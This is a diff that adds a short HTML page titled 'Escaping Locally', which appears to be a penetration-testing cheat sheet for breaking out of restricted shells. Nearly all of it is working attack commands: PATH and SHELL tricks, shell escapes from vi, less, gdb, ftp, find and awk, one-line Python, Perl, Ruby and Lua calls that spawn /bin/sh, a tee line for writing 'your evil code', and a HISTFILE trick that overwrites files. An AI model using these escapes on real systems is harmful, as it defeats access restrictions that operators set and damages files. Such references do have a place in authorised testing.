@@ -1,0 +1,43 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Escaping Locally</title>
+</head><body>Try all commands you can: <br/>
+ls, pwd, cd .., env, set, export, vi, cp, mv, echo $PATH, echo $SHELL, etc<br/>
+<br/>
+Quick Wins<br/>
+If '/' are allowed in commands, just run: /bin/sh<br/>
+If you can set PATH or SHELL, just run:<br/>
+&nbsp;export PATH=/bin:/usr/bin:$PATH<br/>
+&nbsp;export SHELL=/bin/sh<br/>
+If you can copy files into existing PATH, just run: cp /bin/sh /some/dir/from/PATH; sh<br/>
+<br/>
+some commands let you execute other system commands, often bypassing shell restrictions:<br/>
+&nbsp;ftp: !/bin/sh<br/>
+&nbsp;gdb: !/bin/sh<br/>
+&nbsp;more/less/man: !/bin/sh<br/>
+&nbsp;vi/vim: :!/bin/sh<br/>
+&nbsp;scp -S /tmp/getMeOut.sh x y:<br/>
+&nbsp;awk 'BEGIN {system("/bin/sh")}'<br/>
+&nbsp;find / -name someName -exec /bin/sh \;&#09;&#09;make sure the name is findable / exists<br/>
+&nbsp;nice /bin/bash<br/>
+<br/>
+write to files using tee:<br/>
+&nbsp;echo "your evil code" | tee script.sh<br/>
+<br/>
+invoke shell through scripting language:<br/>
+&nbsp;python -c 'import os; os.system("/bin/bash")'<br/>
+&nbsp;python: exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()<br/>
+&nbsp;perl -e 'exec "/bin/sh";'<br/>
+&nbsp;perl: exec "/bin/sh";<br/>
+&nbsp;ruby: exec "/bin/sh"<br/>
+&nbsp;lua: os.execute('/bin/sh')<br/>
+&nbsp;irb(main:001:0&gt; exec "/bin/sh"<br/>
+<br/>
+History file trick:<br/>
+&nbsp;set HISTFILE variable to a file you want to overwrite<br/>
+&nbsp;set HISTSIZE variable to 0 and then immediately to 100<br/>
+&nbsp;Execute lines that you want to be written to your file<br/>
+&nbsp;Log out and log back in again. You have overwritten contents of the file HISTFILE pointed to (also, the original file permissions remained the same!)<br/>
+</body></html>
